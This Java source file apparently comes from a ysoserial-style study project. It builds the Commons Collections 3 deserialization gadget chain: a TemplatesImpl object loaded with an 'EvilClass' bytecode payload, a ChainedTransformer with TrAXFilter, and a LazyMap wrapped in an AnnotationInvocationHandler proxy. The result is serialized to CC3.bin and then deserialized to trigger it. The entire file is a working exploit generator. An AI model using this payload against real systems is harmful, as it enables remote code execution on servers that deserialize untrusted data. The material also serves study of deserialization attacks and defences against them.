package org.su18.serialize.yoserial.CommonCollections.CommonCollections3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.su18.serialize.yoserial.Utils.SerializeUtil;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.io.InputStream;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

/**
 * @author su18
 */
public class CC3 {

	public static String fileName = "CC3.bin";

	public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, InstantiationException {

		// 读取恶意类 bytes[]
		InputStream inputStream = CC3.class.getResourceAsStream("../../../test/EvilClass.class");
		byte[]      bytes       = new byte[inputStream.available()];
		inputStream.read(bytes);

		// 初始化 TemplatesImpl 对象
		TemplatesImpl tmpl      = new TemplatesImpl();
		Field         bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
		bytecodes.setAccessible(true);
		bytecodes.set(tmpl, new byte[][]{bytes});
		// _name 不能为空
		Field name = TemplatesImpl.class.getDeclaredField("_name");
		name.setAccessible(true);
		name.set(tmpl, "su18");


		// 结合 ChainedTransformer
		ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
				new ConstantTransformer(TrAXFilter.class),
				new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl})
		});

		// 初始化 LazyMap
		Map            lazyMap     = LazyMap.decorate(new HashMap(), chain);
		Class<?>       c           = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor<?> constructor = c.getDeclaredConstructors()[0];
		constructor.setAccessible(true);

		// 创建携带着 LazyMap 的 AnnotationInvocationHandler 实例
		InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);
		// 创建LazyMap的动态代理类实例
		Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);

		// 使用动态代理初始化 AnnotationInvocationHandler
		InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, mapProxy);

		SerializeUtil.writeObjectToFile(invocationHandler, fileName);
		SerializeUtil.readFileObject(fileName);
	}

}
